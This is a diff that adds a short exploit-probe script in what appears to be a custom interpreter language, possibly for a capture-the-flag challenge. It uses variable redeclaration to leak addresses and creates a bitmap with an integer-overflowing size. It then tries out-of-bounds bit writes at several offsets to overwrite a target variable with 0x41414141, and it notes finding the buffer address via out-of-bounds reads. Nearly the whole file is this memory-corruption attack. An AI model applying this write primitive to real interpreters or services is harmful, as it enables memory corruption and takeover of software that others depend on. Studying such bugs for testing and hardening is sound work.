@@ -1,0 +1,101 @@
+print("=== Simple Offset Test ===");
+
+print("Step 1: Setup");
+int leak1 = 0;
+string leak1 = "first";
+int addr1 = leak1;
+int target = 0;
+string target = "target";
+int targetaddr = target;
+bitmap b1 = create(9223372036854775807, 2);
+
+print("Step 2: Calculate");
+int bitindex = 29888;
+print("Using calculated bit_index:");
+print(bitindex);
+
+print("Step 3: Try key offsets");
+int testvalue = 1094795585;
+
+print("Test A: bit_index - 256 (might be alignment issue)");
+set(b1, bitindex - 256 + 0, 0, 1);
+set(b1, bitindex - 256 + 6, 0, 1);
+set(b1, bitindex - 256 + 8, 0, 1);
+set(b1, bitindex - 256 + 14, 0, 1);
+set(b1, bitindex - 256 + 16, 0, 1);
+set(b1, bitindex - 256 + 22, 0, 1);
+set(b1, bitindex - 256 + 24, 0, 1);
+set(b1, bitindex - 256 + 30, 0, 1);
+int verifyA = target;
+print("Result A:");
+print(verifyA);
+if (verifyA == testvalue) {
+    print("SUCCESS at bit_index - 256!");
+}
+
+print("Test B: bit_index - 128");
+set(b1, bitindex - 128 + 0, 0, 1);
+set(b1, bitindex - 128 + 6, 0, 1);
+set(b1, bitindex - 128 + 8, 0, 1);
+set(b1, bitindex - 128 + 14, 0, 1);
+set(b1, bitindex - 128 + 16, 0, 1);
+set(b1, bitindex - 128 + 22, 0, 1);
+set(b1, bitindex - 128 + 24, 0, 1);
+set(b1, bitindex - 128 + 30, 0, 1);
+int verifyB = target;
+print("Result B:");
+print(verifyB);
+if (verifyB == testvalue) {
+    print("SUCCESS at bit_index - 128!");
+}
+
+print("Test C: bit_index (calculated)");
+set(b1, bitindex + 0, 0, 1);
+set(b1, bitindex + 6, 0, 1);
+set(b1, bitindex + 8, 0, 1);
+set(b1, bitindex + 14, 0, 1);
+set(b1, bitindex + 16, 0, 1);
+set(b1, bitindex + 22, 0, 1);
+set(b1, bitindex + 24, 0, 1);
+set(b1, bitindex + 30, 0, 1);
+int verifyC = target;
+print("Result C:");
+print(verifyC);
+if (verifyC == testvalue) {
+    print("SUCCESS at bit_index!");
+}
+
+print("Test D: bit_index + 128");
+set(b1, bitindex + 128 + 0, 0, 1);
+set(b1, bitindex + 128 + 6, 0, 1);
+set(b1, bitindex + 128 + 8, 0, 1);
+set(b1, bitindex + 128 + 14, 0, 1);
+set(b1, bitindex + 128 + 16, 0, 1);
+set(b1, bitindex + 128 + 22, 0, 1);
+set(b1, bitindex + 128 + 24, 0, 1);
+set(b1, bitindex + 128 + 30, 0, 1);
+int verifyD = target;
+print("Result D:");
+print(verifyD);
+if (verifyD == testvalue) {
+    print("SUCCESS at bit_index + 128!");
+}
+
+print("Test E: bit_index + 256");
+set(b1, bitindex + 256 + 0, 0, 1);
+set(b1, bitindex + 256 + 6, 0, 1);
+set(b1, bitindex + 256 + 8, 0, 1);
+set(b1, bitindex + 256 + 14, 0, 1);
+set(b1, bitindex + 256 + 16, 0, 1);
+set(b1, bitindex + 256 + 22, 0, 1);
+set(b1, bitindex + 256 + 24, 0, 1);
+set(b1, bitindex + 256 + 30, 0, 1);
+int verifyE = target;
+print("Result E:");
+print(verifyE);
+if (verifyE == testvalue) {
+    print("SUCCESS at bit_index + 256!");
+}
+
+print("If none worked, the bitmap buffer location estimate is likely wrong");
+print("Need to find actual bitmap buffer address via OOB read or other method");
